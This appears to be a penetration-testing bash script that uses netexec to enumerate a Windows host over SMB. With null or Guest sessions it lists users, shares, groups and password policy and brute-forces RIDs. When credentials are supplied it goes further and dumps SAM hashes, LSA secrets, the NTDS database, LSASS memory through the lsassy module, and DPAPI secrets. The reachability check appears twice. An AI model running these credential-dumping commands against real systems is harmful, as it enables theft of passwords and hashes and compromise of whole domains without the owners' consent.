#! /bin/bash

# SMB Enumeration using netexec - nxc
# By the will of the Omnissiah

# Check if a target IP was provided
if [ -z "$1" ]; then
  echo "Usage: $0 <target-ip>"
  exit 1
fi

TARGET=$1
USER=$2
PASS=$3

# Check if the target is reachable
echo "[*] Checking if $TARGET is reachable..."
if ! ping -c 1 $TARGET > /dev/null 2>&1; then
  echo "[*] $TARGET is unreachable."
  exit 1
fi

# Check if the target is reachable
echo "[*] Checking if $TARGET is reachable..."
if ! ping -c 1 $TARGET > /dev/null 2>&1; then
  echo "[*] $TARGET is unreachable."
  exit 1
fi

# Check if USER and PASS are provided for credentialed enumeration
if [ -n "$USER" ] && [ -n "$PASS" ]; then
  echo "[*] Starting Credentialed SMB Enumeration on $TARGET using nxc with user: $USER"

  # Enumerate Users
  netexec smb $TARGET -u "$USER" -p "$PASS" --users

  # Enumerate Shares
  netexec smb $TARGET -u "$USER" -p "$PASS" --shares

  # Enumerate Password Policy
  netexec smb $TARGET -u "$USER" -p "$PASS" --pass-pol

  # Enumerate Groups
  netexec smb $TARGET -u "$USER" -p "$PASS" --groups

  # Brute Force users via RID
  netexec smb $TARGET -u "$USER" -p "$PASS" --rid-brute
  
  netexec smb $TARGET -u "$USER" -p "$PASS" --sam
  
  netexec smb $TARGET -u "$USER" -p "$PASS" --lsa
  
  netexec smb $TARGET -u "$USER" -p "$PASS" --ntds
  
  netexec smb $TARGET -u "$USER" -p "$PASS" -M lsassy
  
  netexec smb $TARGET -u "$USER" -p "$PASS" --dpapi

else
  # Perform Null SMB Enumeration if no credentials are provided
  echo "[*] Starting Null SMB Enumeration on $TARGET using nxc"

  # Enumerate Users
  netexec smb $TARGET -u '' -p '' --users

  # Enumerate Shares
  netexec smb $TARGET -u '' -p '' --shares

  # Enumerate Password Policy
  netexec smb $TARGET -u '' -p '' --pass-pol

  # Enumerate Groups
  netexec smb $TARGET -u '' -p '' --groups

  # Brute Force users via RID
  netexec smb $TARGET -u '' -p '' --rid-brute

  # Perform Guest SMB Enumeration
  echo "[*] Starting Guest SMB Enumeration on $TARGET using nxc"

  # Enumerate Users
  netexec smb $TARGET -u 'Guest' -p '' --users

  # Enumerate Shares
  netexec smb $TARGET -u 'Guest' -p '' --shares

  # Enumerate Password Policy
  netexec smb $TARGET -u 'Guest' -p '' --pass-pol

  # Enumerate Groups
  netexec smb $TARGET -u 'Guest' -p '' --groups

  # Brute Force users via RID
  netexec smb $TARGET -u 'Guest' -p '' --rid-brute
fi
